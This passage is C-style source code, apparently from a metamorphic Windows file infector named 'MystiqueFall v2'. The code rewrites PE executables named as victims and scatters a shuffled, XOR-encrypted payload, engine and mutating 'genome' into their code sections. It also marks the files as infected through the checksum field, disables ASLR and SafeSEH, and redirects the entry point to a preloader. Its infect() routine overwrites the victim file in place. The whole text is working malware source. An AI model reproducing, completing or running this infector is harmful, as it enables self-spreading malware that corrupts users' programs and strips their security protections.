        print_int(abs_import_sz);
        print(" (.data append=");
        print_int(data_append_sz);
        print(")\n");
    }

    // Check .text VA gap and compute va_shift if needed
    text_va_limit = 0;
    next_sec_rva = 0;
    if (pi->text_idx + 1 < pi->num_sec) {
        sec_off = pi->sec_start + (pi->text_idx + 1) * 40;
        next_sec_rva = read_i32(pi->data, sec_off + SEC_RVA_OFF);
        text_va_limit = next_sec_rva - pi->text_rva;
    } else {
        text_va_limit = pi->image_size - pi->text_rva;
        next_sec_rva = pi->image_size;
    }
    old_next_sec_rva = next_sec_rva;

    va_shift = 0;
    if (new_text_size > text_va_limit) {
        needed = align_up(new_text_size, pi->sec_align);
        va_shift = needed - (next_sec_rva - pi->text_rva);
        print("  VA shift: ");
        print_int(va_shift);
        print(" (text needs ");
        print_int(new_text_size);
        print(", had ");
        print_int(text_va_limit);
        print(")\n");
    }

    new_text_rawsz = align_up(new_text_size, pi->file_align);
    delta = new_text_rawsz - pi->text_rawsz;

    // Compute .data VA shift (if .data expansion overflows its VA gap)
    va_shift_data = 0;
    if (pi->data_idx >= 0 && data_append_sz > 0) {
        data_new_rawsz = align_up(pi->data_vsz + data_append_sz, pi->file_align);
        data_delta = data_new_rawsz - pi->data_rawsz;
        if (data_delta < 0) { data_delta = 0; data_new_rawsz = pi->data_rawsz; }

        // Check if .data expansion exceeds VA gap to next section
        data_va_limit = 0;
        next_data_sec_rva = 0;
        if (pi->data_idx + 1 < pi->num_sec) {
            sec_off = pi->sec_start + (pi->data_idx + 1) * 40;
            next_data_sec_rva = read_i32(pi->data, sec_off + SEC_RVA_OFF);
            if (va_shift > 0) { next_data_sec_rva = next_data_sec_rva + va_shift; }
            data_va_limit = next_data_sec_rva - (pi->data_rva + va_shift);
        } else {
            data_va_limit = 999999999;
        }
        if (pi->data_vsz + data_append_sz > data_va_limit) {
            needed = align_up(pi->data_vsz + data_append_sz, pi->sec_align);
            va_shift_data = needed - data_va_limit;
            print("  Data VA shift: ");
            print_int(va_shift_data);
            print("\n");
        }
    } else {
        data_delta = 0;
        data_new_rawsz = pi->data_rawsz;
    }

    out_size = pi->size + delta + data_delta;

    // Extra headroom for .reloc growth (IAT bootstrap + abs-mode fixups add
    // many entries — each FL_ME node contributes data_fixup + iat_fixup
    // relocs, easily 5000+ in total. With many small 4KB-page blocks the
    // overhead can far exceed 8KB. Use 1MB to cover worst case (and rule
    // out reloc-overflow as a remaining failure source).
    out = malloc(out_size + 1048576);
    mem_set(out, 0, out_size + 1048576);

    // Copy everything before .text (includes headers)
    mem_copy(out, pi->data, pi->text_raw);

    // Apply VA shift to post-.text sections in output headers
    if (va_shift > 0) {
        apply_va_shift(out, pi, va_shift);
    }

    // Apply data VA shift to post-.data sections
    if (va_shift_data > 0 && pi->data_idx >= 0) {
        // Shift sections after .data by va_shift_data
        i = 0;
        while (i < pi->num_sec) {
            if (i > pi->data_idx) {
                sec_off = pi->sec_start + i * 40;
                s_rva = read_i32(out, sec_off + SEC_RVA_OFF);
                write_i32(out, sec_off + SEC_RVA_OFF, s_rva + va_shift_data);
            }
            i = i + 1;
        }
        // Shift DataDirectory entries in post-.data sections
        // Use ORIGINAL DD RVAs (from pi->data) to determine which section, since
        // DD values in 'out' were already shifted by va_shift from apply_va_shift
        {
            int dd_base; int orig_dd_rva; int dd_sec;
            dd_base = pi->pe_off + PE_OPT_OFF + PE_DATADIR_OFF;
            j = 0;
            while (j < 16) {
                orig_dd_rva = read_i32(pi->data, dd_base + j * PE_DATADIR_ENTRY_SZ);
                if (orig_dd_rva != 0) {
                    dd_sec = find_section(pi->data, orig_dd_rva);
                    if (dd_sec > pi->data_idx) {
                        // Add va_shift_data on top of already-shifted value in out
                        write_i32(out, dd_base + j * PE_DATADIR_ENTRY_SZ,
                                  read_i32(out, dd_base + j * PE_DATADIR_ENTRY_SZ) + va_shift_data);
                    }
                }
                j = j + 1;
            }
        }
        pi->va_shift_data = va_shift_data;
        print("  Applied data VA shift ");
        print_int(va_shift_data);
        print("\n");
    }

    // Emit .text from chain
    c = head;
    while (c != 0) {
        if (c->src != 0 && c->len > 0) {
            mem_copy(out + pi->text_raw + c->newofs, c->src, c->len);
        }
        c = c->next;
    }

    // Abs-mode: write data + bundle + header + imports to .data; preloader to .text
    {
        // Compute .data extension addresses
        data_ext_base = pi->data_raw + delta + pi->data_vsz;
        data_ext_rva = pi->data_rva + va_shift + pi->data_vsz;
        abs_data_off_rva = data_ext_rva;
        abs_bundle_off_rva = data_ext_rva + ai->data_sz;
        abs_header_off_rva = abs_bundle_off_rva + ai->bundle_sz + header_align_pad;
        abs_iat_off_rva = abs_header_off_rva + header_total;

        // Copy data section to .data extension
        if (ai->data_sz > 0) {
            mem_copy(out + data_ext_base, ai->data_sec, ai->data_sz);
        }

        // Copy bundle data after data section in .data
        if (ai->bundle_sz > 0) {
            mem_copy(out + data_ext_base + ai->data_sz, ai->bundle_buf, ai->bundle_sz);
        }

        // Emit BundleHeader + descriptors after the encrypted bundle bytes.
        // Header is plaintext; descriptors store (kind, offset, size, flags)
        // with offset relative to bundle base (= abs_bundle_off_rva).
        {
            int hp_foff;
            int hdi;
            int hboff;
            hp_foff = data_ext_base + (abs_header_off_rva - data_ext_rva);
            write_i32(out, hp_foff +  0, META_MAGIC);
            write_i32(out, hp_foff +  4, META_VERSION);
            write_i32(out, hp_foff +  8, header_total);
            write_i32(out, hp_foff + 12, header_n_desc);
            // base_addr — absolute address of bundle area (needs .reloc fixup)
            write_i32(out, hp_foff + 16, pi->image_base + abs_bundle_off_rva);
            extra_relocs[extra_reloc_count] = abs_header_off_rva + 16;
            extra_reloc_count = extra_reloc_count + 1;
            write_i32(out, hp_foff + 20, ai->bundle_sz);          // payload_size
            write_i32(out, hp_foff + 24, ai->bundle_key);         // key
            write_i32(out, hp_foff + 28, 0);                       // flags_reserved
            // Descriptors: ENTRY + ENGINE + (PAYLOAD?) + GENOME
            hdi = 0;
            hboff = 0;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_ENTRY);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, ai->entry_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + ai->entry_sz;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_ENGINE);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, ai->eng_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + ai->eng_sz;
            if (ai->pay_sz > 0) {
                write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_PAYLOAD);
                write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
                write_i32(out, hp_foff + 32 + hdi*16 +  8, ai->pay_sz);
                write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
                hdi = hdi + 1; hboff = hboff + ai->pay_sz;
            }
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_GENOME);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, ai->gen_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
        }

        // Patch g_bundle_header → BundleHeader in .data. Entry program reads
        // this on next-gen launch via bundle_open().
        if (g_bundle_header_off >= 0) {
            write_i32(out, data_ext_base + g_bundle_header_off,
                      pi->image_base + abs_header_off_rva);
            extra_relocs[extra_reloc_count] = data_ext_rva + g_bundle_header_off;
            extra_reloc_count = extra_reloc_count + 1;
        }

        // Build import area in .data extension (after header)
        {
            int iat_data_foff;
            iat_data_foff = data_ext_base + (abs_iat_off_rva - data_ext_rva);
            build_abs_import_area(out, iat_data_foff, abs_iat_off_rva, pi,
                                  ai->extern_info, ai->extern_count,
                                  0);
        }

        // Find mystiquefall entry RVA
        mystiquefall_entry_rva = 0;
        entry_node = find_scatter_node(head, ai->entry_off);
        if (entry_node != 0) {
            mystiquefall_entry_rva = entry_node->newrva;
        }
        if (mystiquefall_entry_rva == 0) {
            print("  WARN: abs entry node not found in chain\n");
        }

        // Find payload entry RVA (if payload was scattered)
        {
            int pay_entry_rva;
            pay_entry_rva = -1;
            if (ai->scatter_entry_off >= 0) {
                entry_node = find_scatter_node(head, ai->scatter_entry_off);
                if (entry_node != 0) {
                    pay_entry_rva = entry_node->newrva;
                    print("  Payload entry: rva=");
                    print_int(pay_entry_rva);
                    print("\n");
                }
            }

            // Find OEP
            oep_rva = pi->entry_rva;
            c = head;
            while (c != 0) {
                if (c->oldrva == pi->entry_rva && (c->flags & FL_ME) == 0) {
                    oep_rva = c->newrva;
                    break;
                }
                c = c->next;
            }

            // Write abs entry preloader (with optional payload call)
            abs_preloader_sz = write_abs_entry_preloader(out, pi->text_raw, pi->text_rva,
                                                abs_preloader_off, pi->image_base,
                                                mystiquefall_entry_rva, oep_rva,
                                                pay_entry_rva);
        }

        // Patch abs-mode fixups: data refs → .data extension, IAT refs → .data IAT
        c = head;
        while (c != 0) {
            if ((c->flags & FL_ME) != 0) {
                // Data fixups → absolute address into .data extension
                i = 0;
                while (i < c->n_data_fixups) {
                    addr = pi->image_base + abs_data_off_rva + c->data_fixup_doff[i];
                    write_i32(out, pi->text_raw + c->newofs + c->data_fixup_rel[i], addr);
                    extra_relocs[extra_reloc_count] = pi->text_rva + c->newofs + c->data_fixup_rel[i];
                    extra_reloc_count = extra_reloc_count + 1;
                    i = i + 1;
                }
                // Extern fixups → absolute IAT entry address in .data
                i = 0;
                while (i < c->n_iat_fixups) {
                    addr = pi->image_base + abs_iat_off_rva + c->iat_fixup_idx[i] * 4;
                    write_i32(out, pi->text_raw + c->newofs + c->iat_fixup_rel[i], addr);
                    extra_relocs[extra_reloc_count] = pi->text_rva + c->newofs + c->iat_fixup_rel[i];
                    extra_reloc_count = extra_reloc_count + 1;
                    i = i + 1;
                }
            }
            c = c->next;
        }

        // Fix internal CALL rel32 displacements after scatter
        fix_scatter_call_fixups(out, pi->text_raw, head);
        fix_scatter_faddr_fixups(out, pi->text_raw, head);

        // No .text WRITE flag — data/bundles/imports are in writable .data
    }

    // Copy sections after .text (shifted by delta; post-.data also by data_delta)
    i = 0;
    while (i < pi->num_sec) {
        if (i != pi->text_idx) {
            sec_off = pi->sec_start + i * 40;
            sec_raw = read_i32(pi->data, sec_off + SEC_RAWPTR_OFF);
            sec_rawsz = read_i32(pi->data, sec_off + SEC_RAWSIZE_OFF);
            if (sec_raw >= pi->text_raw + pi->text_rawsz && sec_rawsz > 0) {
                // Compute raw shift: text_delta for all post-.text, + data_delta for post-.data
                {
                    int raw_shift;
                    raw_shift = delta;
                    if (i != pi->data_idx && sec_raw >= pi->data_raw + pi->data_rawsz) {
                        raw_shift = raw_shift + data_delta;
                    }
                    mem_copy(out + sec_raw + raw_shift, pi->data + sec_raw, sec_rawsz);
                    write_i32(out, sec_off + SEC_RAWPTR_OFF, sec_raw + raw_shift);
                }
            }
        }
        i = i + 1;
    }

    // Update .data section header
    if (pi->data_idx >= 0 && data_append_sz > 0) {
        sec_off = pi->sec_start + pi->data_idx * 40;
        write_i32(out, sec_off + SEC_VSIZE_OFF, pi->data_vsz + data_append_sz);
        write_i32(out, sec_off + SEC_RAWSIZE_OFF, data_new_rawsz);
        // .data raw pointer shifted by text delta only (it's between .text and post-.data)
        {
            int dr;
            dr = read_i32(pi->data, sec_off + SEC_RAWPTR_OFF);
            write_i32(out, sec_off + SEC_RAWPTR_OFF, dr + delta);
        }
    }

    // Fix old import descriptors for VA shift (after sections copied)
    // Import data (.rdata) is between .text and .data, so only shifted by va_shift (not va_shift_data)
    if (va_shift > 0 && old_import_count > 0) {
        // The BundleHeader sits between bundle and imports, so the import
        // area starts header_align_pad + header_total bytes after the bundle.
        import_dir_raw = data_ext_base + ai->data_sz + ai->bundle_sz
                       + header_align_pad + header_total
                       + abs_import_sz - (old_import_count + 2) * 20;
        fix_imports_va_shift(out, out_size, va_shift,
                              import_dir_raw, old_import_count);
    }

    // Update .text section header
    sec_off = pi->sec_start + pi->text_idx * 40;
    write_i32(out, sec_off + SEC_VSIZE_OFF, new_text_size);
    write_i32(out, sec_off + SEC_RAWSIZE_OFF, new_text_rawsz);

    // Recompute SizeOfImage
    max_va_end = 0;
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        s_rva = read_i32(out, sec_off + SEC_RVA_OFF);
        s_vsz = read_i32(out, sec_off + SEC_VSIZE_OFF);
        if (s_rva + s_vsz > max_va_end) {
            max_va_end = s_rva + s_vsz;
        }
        i = i + 1;
    }
    new_image_size = align_up(max_va_end, pi->sec_align);
    write_i32(out, pi->pe_off + 24 + 56, new_image_size);

    // Set checksum to infection marker magic (0x4D44A332)
    write_i32(out, pi->pe_off + 24 + 64, 1296343858);

    // Clear DynamicBase (ASLR) — abs fixups use hardcoded VAs
    {
        int dc;
        dc = mf_read_i16(out, pi->pe_off + 24 + 70);
        write_i16(out, pi->pe_off + 24 + 70, dc & 65471);
    }

    // *** Fixups ***

    // Fix branch displacements
    fix_branches(out, head, pi->text_raw);

    // Fix absolute code references (in .text).
    // Collect RVAs of cross-boundary entries that were skipped so
    // rebuild_reloc can drop them (avoids loader corrupting instruction bytes).
    skip_relocs = malloc(256 * 4);
    skip_reloc_count = 0;
    remapped_rvas = malloc(16384 * 4);
    remapped_count = 0;
    fix_abs_code_refs(out, pi, head, pi->text_raw, skip_relocs, &skip_reloc_count,
                      remapped_rvas, &remapped_count);

    // Rebuild .reloc section (with extra entries from abs-mode fixups).
    reloc_sz = rebuild_reloc(out, out_size, pi, head, delta,
                              extra_relocs, extra_reloc_count,
                              skip_relocs, skip_reloc_count);

    // Recompute out_size: .reloc may have grown.
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        sec_raw = read_i32(out, sec_off + SEC_RAWPTR_OFF);
        sec_rawsz = read_i32(out, sec_off + SEC_RAWSIZE_OFF);
        if (sec_raw + sec_rawsz > out_size) {
            out_size = sec_raw + sec_rawsz;
        }
        i = i + 1;
    }

    // Recompute SizeOfImage after rebuild_reloc (which may have grown .reloc)
    max_va_end = 0;
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        s_rva = read_i32(out, sec_off + SEC_RVA_OFF);
        s_vsz = read_i32(out, sec_off + SEC_VSIZE_OFF);
        if (s_rva + s_vsz > max_va_end) {
            max_va_end = s_rva + s_vsz;
        }
        i = i + 1;
    }
    new_image_size = align_up(max_va_end, pi->sec_align);
    write_i32(out, pi->pe_off + 24 + 56, new_image_size);

    // Fix absolute addresses referencing VA-shifted sections.
    // Must run BEFORE fix_external_code_refs — otherwise data→.text
    // pointers whose new RVAs overlap old section ranges get
    // double-remapped.
    if (va_shift > 0) {
        fix_va_shifted_refs(out, out_size, pi, va_shift, old_next_sec_rva,
                            remapped_rvas, remapped_count);
    }

    // Fix code references in other sections (.rdata, .data → .text).
    // Runs after fix_va_shifted_refs so data-section refs are already
    // shifted; only old .text pointers remain to remap.
    fix_external_code_refs(out, pi, head, delta);

    // Clear SafeSEH table — handler RVAs in Load Config don't survive
    // code rearrangement. Actual handler addresses (in PUSH instructions)
    // are updated via reloc entries; only the validation table needs
    // to be disabled.
    lc_rva = read_i32(out, pi->pe_off + PE_OPT_OFF + PE_DATADIR_OFF + 10 * PE_DATADIR_ENTRY_SZ);
    lc_sz = read_i32(out, pi->pe_off + PE_OPT_OFF + PE_DATADIR_OFF + 10 * PE_DATADIR_ENTRY_SZ + 4);
    if (lc_rva != 0 && lc_sz > 0) {
        lc_raw = rva_to_raw(out, lc_rva);
        if (lc_raw >= 0) {
            // Check Load Config.Size >= 72 (need fields at offset 64 and 68)
            if (read_i32(out, lc_raw) >= 72) {
                write_i32(out, lc_raw + 64, 0);
                write_i32(out, lc_raw + 68, 0);
            }
        }
    }

    // Fix entry point → abs preloader
    write_i32(out, pi->pe_off + 24 + 16, pi->text_rva + abs_preloader_off);
    // Bump stack only if victim's is too small for recompilation (need ~4MB)
    if (read_i32(out, pi->pe_off + 24 + 72) < 4194304) {
        write_i32(out, pi->pe_off + 24 + 72, 4194304);
    }
    if (read_i32(out, pi->pe_off + 24 + 76) < 1048576) {
        write_i32(out, pi->pe_off + 24 + 76, 1048576);
    }

    // Free extra relocs and skip relocs
    if (extra_relocs != 0) {
        free(extra_relocs);
    }
    free(skip_relocs);
    free(remapped_rvas);

    // Verification pass
    verify_fixups(out, pi, head, pi->text_raw);

    // Return buffer to caller
    *out_data = out;
    *out_size_ptr = out_size;

    print("  Fixed PE: ");
    print_int(out_size);
    print(" bytes, .text=");
    print_int(new_text_size);
    print(" delta=");
    print_int(delta);
    if (reloc_sz > 0) {
        print(" reloc=");
        print_int(reloc_sz);
    }
    print("\n");

    return new_text_size;
}

// =============================================================================
//
// Infect & Main Module
//
// infect() runs the full integration pipeline (disassemble victim, mix
// payload, fixup, write PE) for a given victim path. infect_one() is the
// bundle-driven engine entry that wraps infect() with InfectBundle plumbing.
// main() is the CLI dispatcher.
//
// =============================================================================

// Full infection pipeline: disassemble victim, mix payload, fixup, return PE
int infect(char* victim_path, char* scatter_data, int scatter_size,
           char* out_path, struct AbsInfo* ai) {
    char* pe_data;
    int pe_size;
    struct PeInfo* pi;
    char* reloc_map;
    char* mark;
    struct CodeNode* victim_head;
    struct CodeNode* scatter_head;
    int node_count;
    int pay_count;
    int code_size;
    int data_size;
    int entry_off;
    int extern_count;
    char* abs_data_ptr;
    char* abs_extern_ptr;
    char* fixed_pe;
    int fixed_pe_size;
    int new_text_size;
    int sec_flags;

    // Read victim PE
    pe_size = 0;
    pe_data = read_file(victim_path, &pe_size);
    if (pe_data == 0) {
        print("ERR: cannot read ");
        print(victim_path);
        print("\n");
        return 1;
    }

    pi = malloc(120);
    if (validate_pe(pe_data, pe_size) == 0) {
        print("ERR: invalid PE\n");
        free(pe_data);
        free(pi);
        return 1;
    }
    load_pe_info(pi, pe_data, pe_size);

    // Check for existing infection: checksum magic
    if (read_i32(pe_data, pi->pe_off + 24 + 64) == 1296343858) {
        print("SKIP: already infected\n");
        free(pe_data);
        free(pi);
        return 0;
    }

    print("Victim: ");
    print(victim_path);
    print(" (.text=");
    print_int(pi->text_vsz);
    print(")\n");

    // Process relocations
    reloc_map = malloc(pi->text_vsz);
    mem_set(reloc_map, 0, pi->text_vsz);
    process_reloc(pi, reloc_map);

    // Disassemble victim .text
    mark = malloc(pi->text_vsz);
    mem_set(mark, 0, pi->text_vsz);
    disassemble_text(pi, mark);

    // Build code chain
    node_count = 0;
    victim_head = build_code_chain(pi, mark, reloc_map, &node_count);
    resolve_branch_links(victim_head);
    merge_reloc_spans(victim_head);

    victim_head = remove_padding(victim_head);

    // Disassemble entry program abs output
    pay_count = 0;
    code_size = 0;
    data_size = 0;
    entry_off = 0;
    extern_count = 0;
    abs_data_ptr = 0;
    abs_extern_ptr = 0;
    scatter_head = disassemble_abs_scatter(scatter_data, scatter_size,
                                            &entry_off, &code_size,
                                            &abs_data_ptr, &data_size,
                                            &abs_extern_ptr, &extern_count,
                                            &pay_count);
    ai->data_sec = abs_data_ptr;
    ai->data_sz = data_size;
    ai->extern_info = abs_extern_ptr;
    ai->extern_count = extern_count;
    ai->entry_off = entry_off;
    ai->scatter_entry_off = -1;
    resolve_branch_links(scatter_head);

    print("MF payload: ");
    print_int(scatter_size);
    print(" bytes, ");
    print_int(pay_count);
    print(" nodes\n");

    // Shuffle and insert entry payload into victim
    prng_seed(runtime_seed());
    scatter_head = shuffle_scatter_functions(scatter_head);
    insert_scatter_functions(victim_head, scatter_head);

    // Build fixed PE
    fixed_pe = 0;
    fixed_pe_size = 0;
    new_text_size = build_fixed_pe(pi, victim_head, &fixed_pe, &fixed_pe_size, ai);
    if (new_text_size == 0 || fixed_pe == 0) {
        print("ERR: .text overflow\n");
        free_chain(victim_head);
        free(mark);
        free(reloc_map);
        free(pi);
        free(pe_data);
        return 1;
    }

    write_file(out_path, fixed_pe, fixed_pe_size);

    print("Infected: ");
    print(out_path);
    print(" (");
    print_int(fixed_pe_size);
    print(" bytes, .text=");
    print_int(new_text_size);
    print(")\n");

    free(fixed_pe);
    free_chain(victim_head);
    free(mark);
    free(reloc_map);
    free(pi);
    free(pe_data);

    return 0;
}

int infect_one(struct InfectBundle* b) {
    char* new_entry_mcb;
    int new_entry_sz;
    char* new_eng_mcb;
    int new_eng_sz;
    char* pay_data;
    int pay_sz;
    char* gen_data;
    int gen_sz;
    int orig_entry_sz;
    int orig_eng_sz;
    char* bundle_buf;
    int bundle_total;
    struct AbsInfo* ai;
    int result;

    // Read original components from the entry's bundle. Fallback for
    // entry/engine when the recompile didn't emit transformed .mcb;
    // direct source for the pass-through payload + mutated genome.
    bundle_get(b->entry_header, BC_ENTRY,  &orig_entry_sz);
    bundle_get(b->entry_header, BC_ENGINE, &orig_eng_sz);
    pay_data = bundle_get(b->entry_header, BC_PAYLOAD, &pay_sz);
    gen_data = bundle_get(b->entry_header, BC_GENOME,  &gen_sz);

    print("Bundles: entry=");
    print_int(orig_entry_sz);
    print(" engine=");
    print_int(orig_eng_sz);
    print(" payload=");
    print_int(pay_sz);
    print(" genome=");
    print_int(gen_sz);
    print("\n");

    // Use transformed mcb produced by entry.mc; fall back to entry's bundle bytes.
    new_entry_mcb = b->new_entry_mcb_data;
    new_entry_sz = b->new_entry_mcb_size;
    if (new_entry_mcb == 0 || new_entry_sz == 0) {
        new_entry_mcb = bundle_get(b->entry_header, BC_ENTRY, &new_entry_sz);
    }
    new_eng_mcb = b->new_engine_mcb_data;
    new_eng_sz = b->new_engine_mcb_size;
    if (new_eng_mcb == 0 || new_eng_sz == 0) {
        new_eng_mcb = bundle_get(b->entry_header, BC_ENGINE, &new_eng_sz);
    }
    if (b->new_payload_mcb_data != 0 && b->new_payload_mcb_size > 0) {
        pay_data = b->new_payload_mcb_data;
        pay_sz = b->new_payload_mcb_size;
    }

    // Build new 4-bundle: [new_entry.mcb | new_eng.mcb | payload | genome]
    bundle_total = new_entry_sz + new_eng_sz + pay_sz + gen_sz;
    bundle_buf = malloc(bundle_total);
    mem_copy(bundle_buf, new_entry_mcb, new_entry_sz);
    mem_copy(bundle_buf + new_entry_sz, new_eng_mcb, new_eng_sz);
    if (pay_sz > 0) {
        mem_copy(bundle_buf + new_entry_sz + new_eng_sz, pay_data, pay_sz);
    }
    mem_copy(bundle_buf + new_entry_sz + new_eng_sz + pay_sz, gen_data, gen_sz);

    // Engine's local g_bundle_header_off comes from its own static compilation.
    // Override with entry's offset so infect patches the entry-program data
    // section (scattered into victim) at the right slot.
    g_bundle_header_off   = b->entry_bundle_header_off;

    // Prepare AbsInfo struct (16 fields * 4 bytes = 64, alloc 68 for safety)
    ai = malloc(68);
    ai->data_sec = 0;
    ai->data_sz = 0;
    ai->extern_info = 0;
    ai->extern_count = 0;
    ai->bundle_buf = bundle_buf;
    ai->bundle_sz = bundle_total;
    ai->entry_sz = new_entry_sz;
    ai->eng_sz = new_eng_sz;
    ai->mcb_sz = new_entry_sz;
    ai->pay_sz = pay_sz;
    ai->gen_sz = gen_sz;
    ai->entry_off = 0;
    ai->scatter_entry_off = -1;
    ai->scatter_abs = 0;
    ai->scatter_abs_sz = 0;
    // Encrypt bundles
    ai->bundle_key = b->prng_seed;
    if (ai->bundle_key == 0) { ai->bundle_key = 305419896; }
    bundle_xor(bundle_buf, bundle_total, ai->bundle_key);

    print("Sizes: entry.abs=");
    print_int(b->entry_pic_size);
    print(" bundle=");
    print_int(bundle_total);
    print(" (entry_mcb=");
    print_int(new_entry_sz);
    print(" eng_mcb=");
    print_int(new_eng_sz);
    print(" pay=");
    print_int(pay_sz);
    print(")\n");

    result = infect(b->victim_path,
                    b->entry_pic_data, b->entry_pic_size,
                    b->victim_path, ai);

    free(bundle_buf);
    free(ai);
    return result;
}

int main() {
    struct InfectBundle* b;
    char* infect_path;
    int result;

    init_io();
    lde_init();

    b = g_infect_bundle;
    if (b == 0) {
        print("MystiqueFall: no embedded bundles\n");
        return 1;
    }

    infect_path = parse_cmdline_infect();
    if (infect_path != 0) {
        print("MystiqueFall v2 — infecting ");
        print(infect_path);
        print("\n");
        b->victim_path = infect_path;
        result = infect_one(b);
        return result;
    }

    return 0;
}

